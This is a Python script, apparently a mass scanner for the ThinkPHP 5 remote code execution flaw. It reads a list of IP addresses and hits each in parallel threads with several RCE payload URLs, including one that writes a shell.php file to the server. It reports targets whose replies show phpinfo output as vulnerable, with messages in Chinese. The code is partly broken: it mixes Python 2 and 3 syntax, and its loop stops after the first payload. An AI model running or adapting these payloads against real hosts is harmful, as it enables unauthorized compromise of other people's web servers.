#!/usr/bin/env python
# -*- coding=utf8 -*-
"""
# Author: Sandy Li
# Created Time : Thu 24 Jan 2019 06:52:37 PM CST
# File Name: thinkphp5_rce_1852.py
# Description:
"""
import  threading, sys, time, random, socket, subprocess, re, os, struct, array
import requests
from threading import Thread
from time import sleep
from requests.auth import HTTPDigestAuth
from decimal import *
import queue
import collections
import argparse
import multiprocessing

Feed = collections.namedtuple("Feed", "url")
lock = threading.RLock()
# targets = open(sys.argv[1], "r").readlines()

#payload = r"public/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"
#payload = "public/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"
"""
#payload = ['', r"public/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
#        r"public/index.php?s=index/\think\Request/input&filter=phpinfo&data=1",
#        r"public/index.php?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
#        r"public/index.php?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=%3C?php%20phpinfo();?%3E",
#        r"public/index.php?s=index/\think\view\driver\Php/display&content=%3C?php%20phpinfo();?%3E"]
"""
"""
class Testing():
    def __init__(self, aname):
        # threading.Thread.__init__(self)
        self.aname = str(aname).rstrip('\n')
    def run(self):
        #for n in range(1,6):
            #print url
            #print i
            try:
                url = "http://" + self.aname + "/" + payload
                r = requests.get(url,verify = False, timeout = 5)
                if 'PHP Version' in r.text:
                    print "[+]目标存在漏洞，请记录URL为 %r" % url
                    return n
                else:
                    print "[！]目标无法连接,URL为%r" % url
                    return False
            except Exception as e:
                pass
"""

def main():
    concurrency, filename = handle_commandline()
    jobs = queue.Queue()
    results = queue.Queue()
    create_threads(concurrency, results, jobs)
    add_jobs(filename, jobs)
    process(jobs)


def handle_commandline():
    parser = argparse.ArgumentParser()
    parser.add_argument("-c", "--concurrency", type=int,
            default=multiprocessing.cpu_count() * 4,
            help="specify the concurrency (for debugging and "
                "timing) [default: %(default)d]")
    parser.add_argument("-t", "--target", type=str,
                        default="ip.txt", help="specify the target file input")
    args = parser.parse_args()
    return args.concurrency, args.target


def add_jobs(filename, jobs):
    for todo, feed in enumerate(iter(filename), start=1):
        jobs.put(feed)
    return todo  # TODO


def iter(filename):
    with open(filename, "rt") as file:
        for line in file:
            line = line.strip('\n')
            if not line:
                continue
            else:
                yield Feed(line)


def create_threads(concurrency, results, jobs):
    for _ in range(concurrency):
        thread = threading.Thread(target=worker, args=(jobs, results))
        thread.daemon = True
        thread.start()


def worker(jobs, results):
    while True:
        try:
            feed = jobs.get()
            shuting_testing(feed.url)
        finally:
            jobs.task_done()


def shuting_testing(aname):
    try:
        lock.acquire()
        ip_scaned = re.findall(
            r"\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b", aname)[0]
        payloads = ['',r"public/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
                r"public/index.php?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
                r"public/index.php?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=%3C?php%20phpinfo();?%3E",
                r"public/index.php?s=index/\think\view\driver\Php/display&content=%3C?php%20phpinfo();?%3E",
                r"public/index.php?s=index/\think\Request/input&filter=phpinfo&data=1"]
        for i in range(1,5):

            url = "http://" + ip_scaned + "/" + payloads[i]
            headers = {'user-agent':'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Mobile Safari/537.36'}
            r = requests.get(url, headers=headers, verify=False, timeout=5)
            if 'PHP Version' in r.text:
                print "[+]目标存在漏洞，请记录URL为 %r" % url
                return i
            else:
                print "[-]目标暂不存在漏洞,URL为%r" % url
                return False
    except Exception as e:
        print('Unable to access port 80:', aname)
    finally:
         lock.release()


def process(jobs):
    canceled = False
    try:
        jobs.join()
    except KeyboardInterrupt:
        print("canceling...")
        canceled = True
    if canceled:
        print("testing interrupted!")
    else:
        print('done!')



if __name__ == "__main__":
    main()





# for target in targets:
#     try:
#         pass
#         # n = Testing(target)
#         # n.daemon = True
#         # n.start()
#
#        # if n:
#        #     print "[+]目标IP地址: %r 存在远程命令执行漏洞" % target
#        # else:
#        #     print "[-]目标IP地址不存在远程命令执行漏洞"
#     except:
#         pass






